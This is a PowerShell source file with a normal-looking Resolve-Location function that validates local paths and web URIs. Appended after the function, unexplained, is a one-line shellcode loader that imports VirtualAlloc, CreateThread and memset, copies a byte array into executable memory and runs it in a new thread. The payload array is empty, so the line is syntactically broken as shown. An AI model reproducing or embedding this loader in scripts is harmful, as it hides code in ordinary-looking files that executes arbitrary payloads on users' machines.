function Resolve-Location
{
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $Location,

        [Parameter(Mandatory=$true)]
        [string]
        $LocationParameterName,

        [Parameter()]
        $Credential,

        [Parameter()]
        $Proxy,

        [Parameter()]
        $ProxyCredential,

        [Parameter()]
        [System.Management.Automation.PSCmdlet]
        $CallerPSCmdlet
    )

    
    if(-not (Test-WebUri -uri $Location))
    {
        if(Microsoft.PowerShell.Management\Test-Path -LiteralPath $Location)
        {
            return $Location
        }
        elseif($CallerPSCmdlet)
        {
            $message = $LocalizedData.PathNotFound -f ($Location)
            ThrowError -ExceptionName "System.ArgumentException" `
                       -ExceptionMessage $message `
                       -ErrorId "PathNotFound" `
                       -CallerPSCmdlet $CallerPSCmdlet `
                       -ErrorCategory InvalidArgument `
                       -ExceptionObject $Location
        }
    }
    else
    {
        $pingResult = Ping-Endpoint -Endpoint $Location -Credential $Credential -Proxy $Proxy -ProxyCredential $ProxyCredential
        $statusCode = $null
        $exception = $null
        $resolvedLocation = $null
        if($pingResult -and $pingResult.ContainsKey($Script:ResponseUri))
        {
            $resolvedLocation = $pingResult[$Script:ResponseUri]
        }

        if($pingResult -and $pingResult.ContainsKey($Script:StatusCode))
        {
            $statusCode = $pingResult[$Script:StatusCode]
        }

        Write-Debug -Message "Ping-Endpoint: location=$Location, statuscode=$statusCode, resolvedLocation=$resolvedLocation"

        if((($statusCode -eq 200) -or ($statusCode -eq 401) -or ($statusCode -eq 407)) -and $resolvedLocation)
        {
            return $resolvedLocation
        }
        elseif($CallerPSCmdlet)
        {
            $message = $LocalizedData.InvalidWebUri -f ($Location, $LocationParameterName)
            ThrowError -ExceptionName "System.ArgumentException" `
                       -ExceptionMessage $message `
                       -ErrorId "InvalidWebUri" `
                       -CallerPSCmdlet $CallerPSCmdlet `
                       -ErrorCategory InvalidArgument `
                       -ExceptionObject $Location
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

